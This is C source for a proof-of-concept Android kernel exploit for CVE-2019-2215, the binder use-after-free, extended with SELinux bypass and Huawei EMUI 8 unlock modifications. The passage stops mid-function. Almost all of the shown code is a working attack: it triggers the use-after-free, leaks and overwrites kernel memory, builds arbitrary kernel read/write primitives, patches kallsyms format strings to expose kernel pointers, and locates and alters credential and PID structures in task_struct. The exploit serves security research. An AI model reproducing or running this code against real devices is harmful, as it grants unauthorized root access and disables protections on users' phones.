/*
 * POC to gain arbitrary kernel R/W access using CVE-2019-2215
 * https://bugs.chromium.org/p/project-zero/issues/detail?id=1942
 *
 * Jann Horn & Maddie Stone of Google Project Zero (2019).
 * Some stuff from Grant Hernandez to achieve root (2019).
 * Mods by Alexander R. Pruss for 3.18 kernels with 0x98 (2019).
 * Mods by Sithi for Huawei devices using EMUI 8 and 4.4.X (2020).
 * Mods by chompie1337 for SELinux bypass and Sepolicy injection (2020).
 * Mods by Roger Ortiz for Huawei devices using EMUI 8 (+ NVE unlock) (2024).
 */

#define DELAY_USEC 200000
#define RETRIES 3
#define MAX_THREADS 3
#define PAGE 0x1000ul
#define BLOCK_SIZE 0x20000

#define KERNEL_BASE search_base
#define USER_DS 0x8000000000ul

#define OFFSET__thread_info__flags 0x000
#define OFFSET__task_struct__stack 0x008

#define OFFSET__cred__uid 0x004
#define OFFSET__cred__securebits 0x024
#define OFFSET__cred__cap_permitted 0x030
#define OFFSET__cred__cap_effective (OFFSET__cred__cap_permitted + 0x008)
#define OFFSET__cred__cap_bset (OFFSET__cred__cap_permitted + 0x010)

#define OFFSET__cred__cap_inheritable 0x028
#define OFFSET__cred__cap_ambient 0x048

#define BINDER_SET_MAX_THREADS 0x40046205ul
#define BINDER_THREAD_EXIT 0x40046208ul

#define DECISION_AVC_CACHE_OFFSET 0x1C
#define AVC_CACHE_SLOTS 0x200
#define AVC_DECISION_ALLOWALL 0xffffffff
#define SEPOL_NOT_VERBOSE 0
#define MAX_SELINUX_CXT_LEN 0x200

#define PROC_KALLSYMS
#define KSYM_NAME_LEN 128

#define MAX_PACKAGE_NAME 1024

#define MIN(x, y) ((x) < (y) ? (x) : (y))
#define MAX(x, y) ((x) > (y) ? (x) : (y))

#define BINDER_THREAD_SZ 0x198
#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16)
#define WAITQUEUE_OFFSET (0xA8)
#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16)
#define UAF_SPINLOCK 0x10001
#define TASK_STRUCT_OFFSET_FROM_TASK_LIST 0xE8

#define IS_KERNEL_POINTER(p) ((p) >= KERNEL_BASE && (p) <= 0xFFFFFFFFFFFFFFFEul)

#define _GNU_SOURCE
#include <ctype.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <libgen.h>
#include <linux/sched.h>
#include <sched.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/uio.h>
#include <sys/un.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#include <sepol/policydb/policydb.h>
#include <sepol/policydb/services.h>

const char *kNvePaths[] = {
    "/dev/block/by-name/nvme",
    "/dev/block/platform/hi_mci.0/by-name/nvme",
    "/dev/block/mmcblk0p7",
};

struct kallsyms {
    unsigned long addresses;
    unsigned long names;
    unsigned long num_syms;
    unsigned long token_table;
    unsigned long markers;
    char *token_table_data;
    unsigned short token_index_data[256];
} kallsyms;

int epfd = -1;
int binder_fd = -1;
int quiet = 0;
int kptrInit = 0;
int have_kallsyms = 0;
int kernel3 = 1;
int have_base = 0;
int good_base = 0;
int oldpid;
unsigned long pid_addr;
char *myName;
unsigned long search_base = 0xffffffc000000000ul;
unsigned long skip1 = 0;
unsigned long skip2 = 0;
unsigned long skip_base = 0;

void message(char *fmt, ...) {
    if (quiet)
        return;
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    putchar('\n');
}

void error(char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vfprintf(stderr, fmt, ap);
    va_end(ap);
    fprintf(stderr, ": %s\n", errno ? strerror(errno) : "error");
    exit(1);
}

unsigned long iovec_size(struct iovec *iov, int n) {
    unsigned long sum = 0;
    for (int i = 0; i < n; i++)
        sum += iov[i].iov_len;
    return sum;
}

unsigned long iovec_max_size(struct iovec *iov, int n) {
    unsigned long m = 0;
    for (int i = 0; i < n; i++) {
        if (iov[i].iov_len > m)
            m = iov[i].iov_len;
    }
    return m;
}

int clobber_data(unsigned long payloadAddress, const void *src,
                 unsigned long payloadLength) {
    int dummyBufferSize = MAX(UAF_SPINLOCK, PAGE);
    char *dummyBuffer = malloc(dummyBufferSize);
    if (dummyBuffer == NULL)
        error("allocating dummyBuffer");

    memset(dummyBuffer, 0, dummyBufferSize);

    message("PARENT: clobbering at 0x%lx", payloadAddress);

    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        error("epoll_add");

    unsigned long testDatum = 0;
    unsigned long const testValue = 0xABCDDEADBEEF1234ul;

    struct iovec iovec_array[IOVEC_ARRAY_SZ];
    memset(iovec_array, 0, sizeof(iovec_array));

    const unsigned SECOND_WRITE_CHUNK_IOVEC_ITEMS = 3;

    unsigned long second_write_chunk[SECOND_WRITE_CHUNK_IOVEC_ITEMS * 2] = {
        (unsigned long)dummyBuffer,
        /* iov_base (currently in use) */ // wq->task_list->next
            SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10,
        /* iov_len (currently in use) */ // wq->task_list->prev

        payloadAddress, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, //
                        // current_ptr + 0x8, /* next iov_base (addr_limit) */
        payloadLength,

        (unsigned long)&testDatum,
        sizeof(testDatum),
    };

    int delta = (UAF_SPINLOCK + sizeof(second_write_chunk)) % PAGE;
    int paddingSize = delta == 0 ? 0 : PAGE - delta;

    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len =
        0; // spinlock: will turn to UAF_SPINLOCK
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base =
        second_write_chunk; // wq->task_list->next: will turn to payloadAddress
                            // of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len =
        sizeof(second_write_chunk); // wq->task_list->prev: will turn to
                                    // payloadAddress of task_list
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base =
        dummyBuffer; // stuff from this point will be overwritten and/or ignored
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len = UAF_SPINLOCK;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 3].iov_len = payloadLength;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_base = dummyBuffer;
    iovec_array[IOVEC_INDX_FOR_WQ + 4].iov_len = sizeof(testDatum);
    int totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);

    int pipes[2];
    pipe(pipes);
    if ((fcntl(pipes[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        error("pipe size");
    if ((fcntl(pipes[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        error("pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        error("fork");
    if (fork_ret == 0) {
        /* Child process */
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        message("CHILD: Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        message("CHILD: Finished EPOLL_CTL_DEL.");

        char *f = malloc(totalLength);
        if (f == NULL)
            error("Allocating memory");
        memset(f, 0, paddingSize + UAF_SPINLOCK);
        unsigned long pos = paddingSize + UAF_SPINLOCK;
        memcpy(f + pos, second_write_chunk, sizeof(second_write_chunk));
        pos += sizeof(second_write_chunk);
        memcpy(f + pos, src, payloadLength);
        pos += payloadLength;
        memcpy(f + pos, &testValue, sizeof(testDatum));
        pos += sizeof(testDatum);
        write(pipes[1], f, pos);
        message("CHILD: wrote %lu", pos);
        close(pipes[1]);
        close(pipes[0]);
        exit(0);
    }

    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    int b = readv(pipes[0], iovec_array, IOVEC_ARRAY_SZ);

    message("PARENT: readv returns %d, expected %d", b, totalLength);

    if (testDatum != testValue)
        message("PARENT: **fail** clobber value doesn't match: is %lx but "
                "should be %lx",
                testDatum, testValue);
    else
        message("PARENT: clobbering test passed");

    free(dummyBuffer);
    close(pipes[0]);
    close(pipes[1]);

    return testDatum == testValue;
}

int leak_data(void *leakBuffer, int leakAmount, unsigned long extraLeakAddress,
              void *extraLeakBuffer, int extraLeakAmount,
              unsigned long *task_struct_ptr_p,
              unsigned long *task_struct_plus_8_p) {
    unsigned long const minimumLeak = TASK_STRUCT_OFFSET_FROM_TASK_LIST + 8;
    unsigned long adjLeakAmount =
        MAX(leakAmount, 4336); // TODO: figure out why we need at least 4336; I
                               // would think that minimumLeak should be enough

    int success = 1;

    struct epoll_event event = {.events = EPOLLIN};
    int max_threads = 2;
    ioctl(binder_fd, BINDER_SET_MAX_THREADS, &max_threads);
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event))
        error("epoll_add");

    struct iovec iovec_array[IOVEC_ARRAY_SZ];

    memset(iovec_array, 0, sizeof(iovec_array));

    int delta = (UAF_SPINLOCK + minimumLeak) % PAGE;
    int paddingSize = (delta == 0 ? 0 : PAGE - delta) + PAGE;

    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 2].iov_len = PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ - 1].iov_len = paddingSize - PAGE;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_base = (unsigned long *)0xDEADBEEF;
    iovec_array[IOVEC_INDX_FOR_WQ].iov_len =
        0; /* spinlock: will turn to UAF_SPINLOCK */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_base =
        (unsigned long *)0xDEADBEEF; /* wq->task_list->next */
    iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len =
        adjLeakAmount; /* wq->task_list->prev */
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_base =
        (unsigned long *)0xDEADBEEF; // we shouldn't get to here
    iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len =
        extraLeakAmount + UAF_SPINLOCK + 8;
    unsigned long totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned long maxLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
    unsigned char *dataBuffer = malloc(maxLength);

    if (dataBuffer == NULL)
        error("Allocating %ld bytes", maxLength);

    for (int i = 0; i < IOVEC_ARRAY_SZ; i++)
        if (iovec_array[i].iov_base == (unsigned long *)0xDEADBEEF)
            iovec_array[i].iov_base = dataBuffer;

    int b;
    int pipefd[2];
    int leakPipe[2];
    if (pipe(pipefd))
        error("pipe");
    if (pipe(leakPipe))
        err(2, "pipe");
    if ((fcntl(pipefd[0], F_SETPIPE_SZ, PAGE)) != PAGE)
        error("pipe size");
    if ((fcntl(pipefd[1], F_SETPIPE_SZ, PAGE)) != PAGE)
        error("pipe size");

    pid_t fork_ret = fork();
    if (fork_ret == -1)
        error("fork");
    if (fork_ret == 0) {
        /* Child process */
        char childSuccess = 1;

        prctl(PR_SET_PDEATHSIG, SIGKILL);
        usleep(DELAY_USEC);
        message("CHILD: Doing EPOLL_CTL_DEL.");
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        message("CHILD: Finished EPOLL_CTL_DEL.");

        unsigned long size1 = paddingSize + UAF_SPINLOCK + minimumLeak;
        message("CHILD: initial portion length 0x%lx", size1);
        char buffer[size1];
        memset(buffer, 0, size1);
        if (read(pipefd[0], buffer, size1) != size1)
            error("reading first part of pipe");

        memcpy(dataBuffer, buffer + size1 - minimumLeak, minimumLeak);

        int badPointer = 0;
        if (memcmp(dataBuffer, dataBuffer + 8, 8))
            badPointer = 1;
        unsigned long addr = 0;
        memcpy(&addr, dataBuffer, 8);

        if (!IS_KERNEL_POINTER(addr)) {
            badPointer = 1;
            childSuccess = 0;
        }

        unsigned long task_struct_ptr = 0;

        memcpy(&task_struct_ptr, dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST,
               8);
        message("CHILD: task_struct_ptr = 0x%lx", task_struct_ptr);

        if (!badPointer &&
            (extraLeakAmount > 0 || task_struct_plus_8_p != NULL)) {
            unsigned long extra[6] = {addr,
                                      adjLeakAmount,
                                      extraLeakAddress,
                                      extraLeakAmount,
                                      task_struct_ptr + 8,
                                      8};
            message("CHILD: clobbering with extra leak structures");
            if (clobber_data(addr, &extra, sizeof(extra)))
                message("CHILD: clobbered");
            else {
                message("CHILD: **fail** iovec clobbering didn't work");
                childSuccess = 0;
            }
        }

        errno = 0;
        if (read(pipefd[0], dataBuffer + minimumLeak,
                 adjLeakAmount - minimumLeak) != adjLeakAmount - minimumLeak)
            error("leaking");

        write(leakPipe[1], dataBuffer, adjLeakAmount);

        if (extraLeakAmount > 0) {
            message("CHILD: extra leak");
            if (read(pipefd[0], extraLeakBuffer, extraLeakAmount) !=
                extraLeakAmount) {
                childSuccess = 0;
                error("extra leaking");
            }
            write(leakPipe[1], extraLeakBuffer, extraLeakAmount);
        }
        if (task_struct_plus_8_p != NULL) {
            if (read(pipefd[0], dataBuffer, 8) != 8) {
                childSuccess = 0;
                error("leaking second field of task_struct");
            }
            message("CHILD: task_struct_ptr = 0x%lx",
                    *(unsigned long *)dataBuffer);
            write(leakPipe[1], dataBuffer, 8);
        }
        write(leakPipe[1], &childSuccess, 1);

        close(pipefd[0]);
        close(pipefd[1]);
        close(leakPipe[0]);
        close(leakPipe[1]);
        message("CHILD: Finished write to FIFO.");

        if (badPointer) {
            errno = 0;
            message("CHILD: **fail** problematic address pointer, e.g., %lx",
                    addr);
        }
        exit(0);
    }
    message("PARENT: soon will be calling WRITEV");
    errno = 0;
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
    b = writev(pipefd[1], iovec_array, IOVEC_ARRAY_SZ);
    message("PARENT: writev() returns 0x%x", (unsigned int)b);
    if (b != totalLength) {
        message("PARENT: **fail** writev() returned wrong value: needed 0x%lx",
                totalLength);
        success = 0;
        goto DONE;
    }

    message("PARENT: Reading leaked data");

    b = read(leakPipe[0], dataBuffer, adjLeakAmount);
    if (b != adjLeakAmount) {
        message("PARENT: **fail** reading leak: read 0x%x needed 0x%lx", b,
                adjLeakAmount);
        success = 0;
        goto DONE;
    }

    if (leakAmount > 0)
        memcpy(leakBuffer, dataBuffer, leakAmount);

    if (extraLeakAmount != 0) {
        message("PARENT: Reading extra leaked data");
        b = read(leakPipe[0], extraLeakBuffer, extraLeakAmount);
        if (b != extraLeakAmount) {
            message(
                "PARENT: **fail** reading extra leak: read 0x%x needed 0x%lx",
                b, extraLeakAmount);
            success = 0;
            goto DONE;
        }
    }

    if (task_struct_plus_8_p != NULL) {
        if (read(leakPipe[0], task_struct_plus_8_p, 8) != 8) {
            message("PARENT: **fail** reading leaked task_struct at offset 8");
            success = 0;
            goto DONE;
        }
    }

    char childSucceeded = 0;

    read(leakPipe[0], &childSucceeded, 1);
    if (!childSucceeded)
        success = 0;

    if (task_struct_ptr_p != NULL)
        memcpy(task_struct_ptr_p,
               dataBuffer + TASK_STRUCT_OFFSET_FROM_TASK_LIST, 8);

DONE:
    close(pipefd[0]);
    close(pipefd[1]);
    close(leakPipe[0]);
    close(leakPipe[1]);

    int status;
    wait(&status);

    free(dataBuffer);

    if (success)
        message("PARENT: leaking successful");

    return success;
}

int leak_data_retry(void *leakBuffer, int leakAmount,
                    unsigned long extraLeakAddress, void *extraLeakBuffer,
                    int extraLeakAmount, unsigned long *task_struct_ptr_p,
                    unsigned long *task_struct_plus_8_p) {
    int try = 0;
    while (try < RETRIES &&
           !leak_data(leakBuffer, leakAmount, extraLeakAddress, extraLeakBuffer,
                      extraLeakAmount, task_struct_ptr_p,
                      task_struct_plus_8_p)) {
        message("MAIN: **fail** retrying");
        try++;
    }
    if (0 < try && try < RETRIES)
        message("MAIN: it took %d tries, but succeeded", try);
    return try < RETRIES;
}

int clobber_data_retry(unsigned long payloadAddress, const void *src,
                       unsigned long payloadLength) {
    int try = 0;
    while (try < RETRIES && !clobber_data(payloadAddress, src, payloadLength)) {
        message("MAIN: **fail** retrying");
        try++;
    }
    if (0 < try && try < RETRIES)
        message("MAIN: it took %d tries, but succeeded", try);
    return try < RETRIES;
}

int kernel_rw_pipe[2];

struct kernel_buffer {
    unsigned char pageBuffer[PAGE];
    unsigned long pageBufferOffset;
} kernel_buffer = {.pageBufferOffset = 0};

void reset_kernel_pipes() {
    kernel_buffer.pageBufferOffset = 0;
    close(kernel_rw_pipe[0]);
    close(kernel_rw_pipe[1]);
    if (pipe(kernel_rw_pipe))
        error("kernel_rw_pipe");
}

int raw_kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
    if (len > PAGE)
        error("kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], buf, len) != len ||
        read(kernel_rw_pipe[0], (void *)kaddr, len) != len) {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

unsigned long kernel_write(unsigned long kaddr, void *buf, unsigned long len) {
    unsigned long ret = raw_kernel_write(kaddr, buf, len);
    if (len != ret)
        error("error with kernel writing");
    return ret;
}

int raw_kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
    if (len > PAGE)
        error("kernel writes over PAGE_SIZE are messy, tried 0x%lx", len);
    if (write(kernel_rw_pipe[1], (void *)kaddr, len) != len ||
        read(kernel_rw_pipe[0], buf, len) != len) {
        reset_kernel_pipes();
        return 0;
    }
    return len;
}

int kernel_read(unsigned long kaddr, void *buf, unsigned long len) {
    if (len > PAGE)
        error("kernel reads over PAGE_SIZE are messy, tried 0x%lx", len);
    if (len != raw_kernel_read(kaddr, buf, len))
        message("error with kernel reading");

    return len;
}

unsigned char kernel_read_uchar(unsigned long offset) {
    if (kernel_buffer.pageBufferOffset == 0 ||
        offset < kernel_buffer.pageBufferOffset ||
        kernel_buffer.pageBufferOffset + PAGE <= offset) {
        kernel_buffer.pageBufferOffset = offset & ~(PAGE - 1);
        kernel_read(kernel_buffer.pageBufferOffset, kernel_buffer.pageBuffer,
                    PAGE);
    }
    return kernel_buffer.pageBuffer[offset - kernel_buffer.pageBufferOffset];
}

unsigned long kernel_read_ulong(unsigned long kaddr) {
    unsigned long data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}

unsigned long kernel_read_uint(unsigned long kaddr) {
    unsigned int data;
    kernel_read(kaddr, &data, sizeof(data));
    return data;
}

void kernel_write_ulong(unsigned long kaddr, unsigned long data) {
    kernel_write(kaddr, &data, sizeof(data));
}

unsigned long kernel_write_uint(unsigned long kaddr, unsigned int data) {
    return kernel_write(kaddr, &data, sizeof(data));
}

void kernel_write_uchar(unsigned long kaddr, unsigned char data) {
    kernel_write(kaddr, &data, sizeof(data));
}

int verifyCred(unsigned long cred_ptr) {
    unsigned uid;
    if (cred_ptr < 0xffffff0000000000ul ||
        4 != raw_kernel_read(cred_ptr + OFFSET__cred__uid, &uid, 4))
        return 0;
    return uid == getuid();
}

int getCredOffset(unsigned char *task_struct_data) {
    char taskname[16];
    unsigned n = MIN(strlen(myName) + 1, 16);
    memcpy(taskname, myName, n);
    taskname[15] = 0;

    for (int i = OFFSET__task_struct__stack + 8; i < PAGE - 16; i += 8) {
        if (0 == memcmp(task_struct_data + i, taskname, n) &&
            verifyCred(*(unsigned long *)(task_struct_data + i - 8)))
            return i - 8;
    }

    errno = 0;
    error("Cannot find cred structure");
    return -1;
}

int getSeccompOffset(unsigned char *task_struct_data, unsigned credOffset,
                     unsigned seccompStatus) {
    if (seccompStatus != 2)
        return -1;

    unsigned long firstGuess = -1;

    for (int i = credOffset & ~7; i < PAGE - 24; i += 8) {
        struct {
            unsigned long seccomp_status;
            unsigned long seccomp_filter;
            unsigned int parent_exe;
            unsigned int child_exe;
        } *p = (void *)(task_struct_data + i);

        if (p->seccomp_status == seccompStatus &&
            IS_KERNEL_POINTER(p->seccomp_filter)) {
            if (p->child_exe == p->parent_exe + 1) {
                return i;
            } else {
                if (firstGuess < 0)
                    firstGuess = i;
            }
        }
    }

    return firstGuess;
}

unsigned long countIncreasingEntries(unsigned long start) {
    unsigned long count = 1;
    unsigned long prev = kernel_read_ulong(start);
    do {
        start += 8;
        if (start == skip1 && kptrInit == 1) {
            start = skip2;
            count += 31;
            continue;
        }
        unsigned long v = kernel_read_ulong(start);
        if (v < prev)
            return count;
        count++;
    } while (1);
}

int increasing(unsigned long *location, unsigned n) {
    for (int i = 0; i < n - 1; i++)
        if (location[i] > location[i + 1])
            return 0;
    return 1;
}

int fixKallsymsFormatStrings(unsigned long start) {
    errno = 0;

    int found = 0;

    start &= ~(PAGE - 1);

    unsigned long searchTarget;

    memcpy(&searchTarget, "%pK %c %", 8);

    int backwards = 1;
    int forwards = 1;
    int direction = 1;
    unsigned long forwardAddress = start;
    unsigned long backwardAddress = start - PAGE;
    unsigned long page[PAGE / 8];

    message("MAIN: searching for kallsyms format strings");

    while ((backwards || forwards) && found < 2) {
        unsigned long address =
            direction > 0 ? forwardAddress : backwardAddress;
        message("KASLR: searching page at %lx", address);

        int ret = raw_kernel_read(address, page, PAGE);
        if (ret != PAGE) {
            message("KASLR: **fail** got %d instead of %d", ret, PAGE);
            if (direction > 0)
                forwards = 0;
            else
                backwards = 0;
        } else {
            for (int i = 0; i < PAGE / 8; i++)
                if (page[i] == searchTarget) {
                    message("KASLR: maybe matched format string! %lu", page[i]);
                    unsigned long a = address + 8 * i;

                    char fmt[16];

                    kernel_read(a, fmt, 16);

                    if (!strcmp(fmt, "%pK %c %s\t[%s]\x0A")) {
                        message("KASLR: patching longer version at %lx", a);
                        if (15 !=
                            raw_kernel_write(a, "%p %c %s\t[%s]\x0A", 15)) {
                            message("KASLR: **fail** probably you have "
                                    "read-only const storage");
                            return found;
                        }
                        found++;
                    } else if (!strcmp(fmt, "%pK %c %s\x0A")) {
                        message("KASLR: patching shorter version at %lx", a);
                        if (15 != raw_kernel_write(a, "%p %c %s\x0A", 10)) {
                            message("KASLR: **fail** probably you have "
                                    "read-only const storage");
                            return found;
                        }
                        found++;
                    }

                    if (found >= 2)
                        return 2;
                }
        }

        if (direction > 0)
            forwardAddress += PAGE;
        else
            backwardAddress -= PAGE;

        direction = -direction;

        if (direction < 0 && !backwards) {
            direction = 1;
        } else if (direction > 0 && !forwards) {
            direction = -1;
        }
    }
    message("KASLR: found and replaced %d format strings", found);

    return found;
}

int find_kallsyms_addresses(unsigned long searchStart, unsigned long searchEnd,
                            unsigned long *startP, unsigned long *countP) {
    if (searchStart == 0)
        searchStart = KERNEL_BASE;
    if (searchEnd == 0)
        searchEnd = searchStart + 0x5000000;
    unsigned char page[PAGE];
    for (unsigned long i = searchStart; i < searchEnd; i += PAGE) {
        if (PAGE == raw_kernel_read(i, page, PAGE))
            for (int j = 0; j < PAGE; j += 0x100) {
                if (IS_KERNEL_POINTER(*(unsigned long *)(page + j)) &&
                    increasing((unsigned long *)(page + j), 256 / 8 - 1)) {
                    unsigned long count = countIncreasingEntries(i + j);
                    if (count >= 40000) {
                        *startP = i + j;
                        *countP = count;
                        return 1;
                    }
                }
            }
    }
    return 0;
}

int get_kallsyms_name(unsigned long offset, char *name) {
    unsigned char length = kernel_read_uchar(offset++);

    for (unsigned char i = 0; i < length; i++) {
        int index = kallsyms.token_index_data[kernel_read_uchar(offset++)];
        int n = strlen(kallsyms.token_table_data + index);
        memcpy(name, kallsyms.token_table_data + index, n);
        name += n;
    }
    *name = 0;

    return 1 + length;
}

int loadKallsyms() {
    if (have_kallsyms)

        return 1;
    if (!find_kallsyms_addresses(0, 0, &kallsyms.addresses, &kallsyms.num_syms))
        return 0;

    message("MAIN: kallsyms names start at 0x%lx and have %ld entries",
            kallsyms.addresses, kallsyms.num_syms);
    unsigned long offset = kallsyms.addresses + 8 * kallsyms.num_syms;

    message("MAIN: kallsyms names end at 0x%lx", offset);
    unsigned long ost = offset;
    offset = (offset + 0xFFul) & ~0xFFul;

    unsigned long count = kernel_read_ulong(offset);
    offset += 8;

    if (count != kallsyms.num_syms) {
        message("MAIN: inconcistency in kallsyms table size %ld vs %ld", count,
                kallsyms.num_syms);
        if (count - 20 > kallsyms.num_syms || count > kallsyms.num_syms) {
            message("MAIN: **fail** kallsym entry count mismatch %ld", count);
            have_base = 1;
            if (kallsyms.num_syms < 60000) {
                skip1 = ost;
                skip_base = search_base;
            }
            if (kallsyms.num_syms > 70000)
                skip2 = kallsyms.addresses;
            return 0;
        }
        kallsyms.num_syms = count;
        kallsyms.addresses =
            offset - 8 * kallsyms.num_syms; // Strip start of table to the
                                            // location suggested by count
        // This should work if we got the offset correct, i.e. we found the end
        // of the table correctly but the start was too early. If we missed some
        // of the start, we MUST have got it wrong because there wasn't an
        // increasing sequence, so we bail out in the if block above.
    }

    offset = (offset + 0xFFul) & ~0xFFul;

    kallsyms.names = offset;

    for (unsigned long i = 0; i < kallsyms.num_syms; i++) {
        unsigned char len = kernel_read_uchar(offset++);
        offset += len;
    }

    offset = (offset + 0xFF) & ~0xFFul;

    kallsyms.markers = offset;

    offset += 8 * ((kallsyms.num_syms + 255ul) / 256ul);

    offset = (offset + 0xFF) & ~0xFFul;

    kallsyms.token_table = offset;

    int tokens = 0;

    while (tokens < 256) {
        if (kernel_read_uchar(offset++) == 0)
            tokens++;
    }

    unsigned long token_table_length = offset - kallsyms.token_table;

    kallsyms.token_table_data = malloc(token_table_length);

    errno = 0;
    if (kallsyms.token_table_data == NULL)
        error("allocating token table");

    for (unsigned long i = 0; i < token_table_length; i++)
        kallsyms.token_table_data[i] =
            kernel_read_uchar(kallsyms.token_table + i);

    offset = (offset + 0xFF) & ~0xFFul;

    kernel_read(offset, kallsyms.token_index_data,
                sizeof(kallsyms.token_index_data));

    have_kallsyms = 1;
    good_base = 1;
    return 1;
}

unsigned long find_symbol_in_memory(char *symbol) {
    if (!loadKallsyms()) {
        message("MAIN: **fail** cannot find kallsyms table");
        return 0;
    }

    unsigned long offset = kallsyms.names;
    char name[KSYM_NAME_LEN];
    unsigned n = strlen(symbol);

    for (unsigned long i = 0; i < kallsyms.num_syms; i++) {
        unsigned int n1 = get_kallsyms_name(offset, name);
        if (!strncmp(name + 1, symbol, n) &&
            (name[1 + n] == '.' || !name[1 + n])) {
            unsigned long address =
                kernel_read_ulong(kallsyms.addresses + i * 8);
            message("MAIN: found %s in kernel memory at %lx", symbol, address);

            return address;
        }
        offset += n1;
    }

    return 0;
}

unsigned long find_symbol(char *symbol) {
    unsigned long address = 0;

#ifndef PROC_KALLSYMS
    address = find_symbol_in_memory(symbol);
#else
    char buf[1024];
    buf[0] = 0;
    errno = 0;

    FILE *ks = fopen("/proc/kallsyms", "r");
    if (ks == NULL) {
        return find_symbol_in_memory(symbol);
    }
    fgets(buf, 1024, ks);
    if (ks != NULL)
        fclose(ks);

    if ((buf[0] == 0 || strncmp(buf, "0000000000000000", 16) == 0)) {
        address = find_symbol_in_memory(symbol);
    } else {
        ks = fopen("/proc/kallsyms", "r");
        while (NULL != fgets(buf, sizeof(buf), ks)) {
            unsigned long a;
            unsigned char type;
            unsigned n = strlen(symbol);
            char sym[1024];
            sscanf(buf, "%lx %c %s", &a, &type, sym);
            if (!strncmp(sym, symbol, n) && (sym[n] == '.' || !sym[n])) {
                message("found %s in /proc/kallsyms", sym);
                address = a;
                break;
            }
        }

        fclose(ks);
    }
#endif

    return address;
}

void kptr_leak(unsigned long task_struct_ptr) {
    for (int i = 0; i < PAGE - 16; i += 8) {
        if (kernel_read_ulong(task_struct_ptr + i - 8) > 0xffffff0000000000) {
            message("searching at 0x%lx",
                    kernel_read_ulong(task_struct_ptr + i - 8));
            unsigned long bk_search_base = search_base;
            search_base = kernel_read_ulong(task_struct_ptr + i - 8);
            search_base = (search_base) & ~0xFFFFFul;
            message("search_base (AND) 0x%lx", search_base);
            loadKallsyms();
            if (have_base == 0) {
                search_base = bk_search_base;
            }
            if (good_base == 1) {
                return;
            }
            if (skip1 != 0 && skip2 != 0) {
                search_base = skip_base;
                return;
            }
            have_base = 0;
        }
    }
    message("kptr_leak finished");
    return;
}

void pidAddr(unsigned long task_struct_ptr) {
    for (int i = 0; i < PAGE - 16; i += 8) {
        if (kernel_read_uint(task_struct_ptr + i - 8) == gettid()) {
            message("possible PID address at 0x%lx", task_struct_ptr + i - 8);
            oldpid = getpid();
            printf("PID: %lu\n", kernel_read_uint(task_struct_ptr + i - 8));
            kernel_write_uint(task_struct_ptr + i - 8, 1);
            printf("PID: %lu\n", kernel_read_uint(task_struct_ptr + i - 8));
            pid_addr = task_struct_ptr + i - 8;
            return;
        }
    }
    return;
}

void checkKernelVersion() {
    kernel3 = 1;
    FILE *k = fopen("/proc/version", "r");
    if (k != NULL) {
        char buf[1024] = "";
        fgets(buf, sizeof(buf), k);
        if (NULL != strstr(buf, "Linux version 4"))
            kernel3 = 0;
    }
    if (kernel3)
        message("MAIN: detected kernel version 3");
    else
        message("MAIN: detected kernel version other than 3");
}

/* for devices with randomized thread_info location on stack: thanks to
 * chompie1337 */
unsigned long find_thread_info_ptr_kernel3(unsigned long kstack) {
    unsigned long kstack_data[16384 / 8];

    message("MAIN: parsing kernel stack to find thread_info");
    if (!leak_data_retry(NULL, 0, kstack, kstack_data, sizeof(kstack_data),
                         NULL, NULL))
